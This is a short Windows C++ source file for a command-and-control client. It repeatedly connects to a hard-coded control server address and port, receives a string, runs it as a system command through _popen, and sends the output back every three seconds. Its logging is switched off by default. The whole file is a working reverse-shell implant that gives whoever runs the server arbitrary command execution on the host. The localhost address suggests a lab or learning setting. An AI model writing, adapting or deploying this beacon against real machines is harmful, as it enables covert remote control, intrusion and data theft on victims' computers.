#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <iostream>
#include <conio.h>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

#define BUF_LEN 512
#define DEF_PORT 27015

#define SERVER_IP "127.0.0.1"

#define LOG 0


void execute_command_from_server(const SOCKET& connection, const sockaddr_in& server) {
	char recvbuf[BUF_LEN]; ZeroMemory(recvbuf, BUF_LEN);
	std::string result;

	int bytes = recv(connection, recvbuf, BUF_LEN, 0);

	#if LOG
	std::cout << "--BEGIN MESSAGE--\n\t" << recvbuf << "\n--END MESSAGE--\n";
	#endif

	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(recvbuf, "r"), _pclose);

	while (fgets(recvbuf, BUF_LEN, pipe.get()) != nullptr) {
		result += recvbuf;
		ZeroMemory(recvbuf, BUF_LEN);
	}

	// write result back
	send(connection, result.data(), result.length(), 0);
}

int main() {
	std::cout << "Client Server:\n";

	WSADATA wsaData;
	int err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	// control server info
	sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(DEF_PORT);
	inet_pton(AF_INET, SERVER_IP, &server.sin_addr);
	
	
	while (1) {
		// set up up connection socket
		SOCKET connection = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		err = connect(connection, (struct sockaddr*)&server, sizeof(server));

		#if LOG
		std::cout << "Connected to control\n\n";
		#endif

		execute_command_from_server(connection, server);

		#if LOG
		std::cout << "Closing connection\n";
		#endif
		closesocket(connection);

		#if LOG
		std::cout << "Sleeping...\n";
		#endif
		Sleep(3000); // <- sleep 3 seconds
	}

	WSACleanup();
}